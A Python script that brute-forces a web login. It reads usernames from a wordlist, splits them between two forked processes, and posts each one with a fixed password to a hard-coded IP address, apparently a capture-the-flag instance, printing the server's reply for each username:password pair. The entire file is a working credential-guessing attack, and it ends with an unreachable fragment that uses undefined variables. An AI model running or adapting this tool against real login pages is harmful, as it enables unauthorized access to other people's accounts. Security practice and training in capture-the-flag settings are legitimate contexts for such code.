import requests
from bs4 import BeautifulSoup
import os

def request(name, password):
    url = 'http://35.190.155.168/74760c4b15/login'
    payload = {'username' : name, 'password' : password}
    r = requests.post(url, payload)
    soup = BeautifulSoup(r.text, 'html.parser')
    page = soup.find('p').getText()
    return page

def load():
    try:
        with open('wordlist.txt', 'r') as wl:
            wl = wl.readlines()
            wl = list(map(lambda x: x.replace('\n',''), wl))
            size = len(wl)
            if not size%2==0:
                size+=1
            half = int(size/2)
            return wl[0:half], wl[half:size]
    except FileNotFoundError:
        print('File not found')
        exit()

def loop():
    password = 'pass'
    plist, clist = load()
    #pid = 12
    pid = os.fork()
    if pid == 0:
        child(clist, password)
    else:
        parent(plist, password)

def parent(users, password):
    for username in users:
        out = request(username, password)
        print('{}\t\t\t{}:{}'.format(out, username, password))

def child(users, password):
    print('Created child', os.getpid())
    for username in users:
        out = request(username, password)
        print('{}\t\t\t{}:{}'.format(out, username, password))

if __name__ == '__main__':
    loop()
    exit()

    out = request(username, password)
    print(out)
    #r = requests.post(url, payload)
    #print(output.text)
    #if 'Invalid' in output.text:
    #    print('Invalido')
